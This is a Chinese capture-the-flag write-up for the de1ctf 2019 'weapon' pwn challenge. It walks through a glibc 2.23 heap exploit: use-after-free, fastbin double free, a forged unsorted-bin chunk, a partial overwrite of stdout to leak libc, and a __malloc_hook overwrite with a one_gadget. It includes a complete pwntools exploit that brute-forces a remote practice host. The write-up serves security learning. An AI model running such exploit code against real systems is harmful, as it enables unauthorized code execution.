+<p>其实思路很简单，我们现在没有show函数，就要通过别的方法去泄露libc，那这个时候就要利用到stdout，如果我们可以修改这个位置的缓冲区，那就可以达到泄露libc的效果，怎么去修改呢，这个也好像，我们只要能申请到一个堆块，这个堆块刚好可以覆盖住stdout结构体就可以了</p>
+<p>我们先进行简单的逆向（最后需要爆破，但是我本地关了aslr，所以我最开始的脚本没有涉及爆破，后面也会把爆破的脚本写出来）</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc-2.23.so'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'choice &gt;&gt; '</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'wlecome input your size of weapon: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'input index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'input your name:'</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'choice &gt;&gt;'</span><span class="p">,</span><span class="s1">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'idx: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'content: '</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'choice &gt;&gt;'</span><span class="p">,</span><span class="s1">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'idx :'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">"b *$rebase(0xe18)"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+
+<span class="n">pwn</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<p>我们一步步看到底怎么办</p>
+<p>可以注意到，我们只有一个uaf可以利用，我们需要申请到io结构体的位置，而恰好，unsortedbin在free之后，会泄露出main_arena+88的数据，而这个数据和io结构体的地址极其相似（在ubuntu16.04只有一位不同，爆破概率是十六分之一，但是在18.04之后只有4096分之一）</p>
+<p>这就涉及到堆风水的利用，我们到底应该怎么去构造出unsortbin，这也是一个难点</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221137-22f883d4-4c22-1.png"/></p>
+<p>先按照这样申请六个堆块，至于为什么是六个，还要这么写，后面就会知道了（堆风水只能这么说，不然说不清楚）</p>
+<p>来用vis看看堆结构吧</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221153-2c8fd906-4c22-1.png"/></p>
+<p>注意我拿鼠标高亮的这个位置，一个颜色对应一个堆块，但是你可以发现这个0x6f刚好又对应下一个堆块（其实0x60到0x6f都行），除此之外，还要注意堆块的低地址，大家都知道堆块的地址会变化，但是其实最后三位是不变的，这就很有用</p>
+<p>我们接着看</p>
+<div class="highlight"><pre><span></span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</pre></div>
+<p>先构造出一个double free达到任意地址申请</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221223-3e7d81f4-4c22-1.png"/></p>
+<p>在完成double free之后，会有这样的一个链表，我们可以修改指针</p>
+<p>再申请一个0x50大小的堆块，这时候申请的堆块就是堆块0，它指向的是下一个堆块地址，原本指向60结尾的这个，但是这个时候我们可以对他进行修改</p>
+<pre><code>add(0x50,0,'\xb0')</code></pre>
+<p>看看这个时候的链表</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221301-557d582a-4c22-1.png"/></p>
+<p>这个时候你会发现连边变成了从60指向00再指向b0</p>
+<p>而b0这个位置就是我们刚刚写0x6f的位置，可以上去翻一翻</p>
+<p>那我们再申请三个堆块，第三个堆块就会是我们伪造的堆块</p>
+<p>接着往下看</p>
+<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd1</span><span class="p">))</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221325-63afbbb8-4c22-1.png"/></p>
+<p>你看，我们通过伪造的这个堆块，成功把原本的堆块的size改成了0xd1，这样的话就伪造出了一个free之后位于unsortbin的堆块</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221408-7cef9896-4c22-1.png"/></p>
+<p>这个时候的2号堆块就是我们伪造出来的堆块，把2free就可以泄露出我们的libc，但是因为没有show函数，所以这个是没有办法打印出来的，但是好在我们已经把这个libc地址写进了堆块中</p>
+<p>我们接着来看</p>
+<p>这时候2这个堆块里面是包裹住3了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221433-8c36ba0a-4c22-1.png"/></p>
+<p>但是实际情况是我们没有对3进行操作，那如果我们再把3free了呢</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221454-98b9ed6a-4c22-1.png"/></p>
+<p>这个时候，其实就产生了一个fastbin的堆块，被2包裹住了，这个时候3号堆块被free了两次</p>
+<p>然后我们申请0x50大小的堆块，进行分割，不能和fastbin里面的堆块大小一样，不然会把fastbin里面的堆块申请出来，我们是想用unsortbin去把libc写到fastbin的堆块里面去</p>
+<p>这个时候申请第一个堆块是用来分割unsortbin，第二个堆块是把unsortbin从链表里面摘出来，第三个堆块是申请出fastbin，因为被free了两次，所以我们要申请一下。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221526-abdb19d2-4c22-1.png"/></p>
+<p>可以看到，我们的fastbin里面写入了libc地址，然后我们再看stdout的地址</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221545-b72c724a-4c22-1.png"/></p>
+<p>stdout结构体现在是在0x7ffff7bc5620的位置，而我们写入的libc在0x7ffff7bc4b61</p>
+<p>可以看到，我们只有末尾两个字节不同，但是我们现在可以修改末尾两个字节，严格来说，我们最后三位都是固定的，也就是这个4有16种可能，也就是我们说的，需要进行爆破</p>
+<p>由于size检查的原因，我们只能申请到stdout上面0x43的位置，在这里伪造我们的堆块</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221607-c438950e-4c22-1.png"/></p>
+<p>也就是说，我们现在需要把后四位改成55dd，第一个5是有十六分之一的概率是对的</p>
+<p>理论上可以直接edit，但是我用会出点问题，所以我还是按照上面的方法写的，伪造堆块然后溢出</p>
+<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s1">'</span><span class="se">\x10</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6f</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">'</span><span class="se">\xdd\x25</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x33</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c5600</span>  
+    <span class="k">if</span> <span class="n">libc_base</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x3c5600</span><span class="p">:</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s1">'libc_base--&gt;'</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</pre></div>
+<p>然后就是正常的劫持malloc就行</p>
+<div class="highlight"><pre><span></span><span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>
+    <span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span><span class="mh">0x4526a</span><span class="p">,</span><span class="mh">0xf02a4</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">one</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">'one_gdbget--&gt;'</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x13</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<p>最后把完整的exp附上</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc-2.23.so'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'choice &gt;&gt; '</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'wlecome input your size of weapon: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'input index:'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'input your name:'</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'choice &gt;&gt;'</span><span class="p">,</span><span class="s1">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'idx: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'content: '</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'choice &gt;&gt;'</span><span class="p">,</span><span class="s1">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'idx :'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">"b *$rebase(0xe18)"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+    <span class="c1">#launch_gdb()</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6f</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">'</span><span class="se">\xb0</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd1</span><span class="p">))</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s1">'</span><span class="se">\x10</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6f</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">'</span><span class="se">\xdd\x25</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="s1">'aaaa'</span><span class="p">)</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x33</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c5600</span>
+    <span class="k">if</span> <span class="n">libc_base</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x3c5600</span><span class="p">:</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s1">'libc_base--&gt;'</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+    <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>
+    <span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span><span class="mh">0x4526a</span><span class="p">,</span><span class="mh">0xf02a4</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">one</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">'one_gdbget--&gt;'</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x13</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="c1">#io=process('./de1ctf_2019_weapon')</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'node5.buuoj.cn'</span><span class="p">,</span><span class="s1">'29507'</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">pwn</span><span class="p">()</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240727221629-d1015212-4c22-1.png"/></p>
+</div>
+</div>
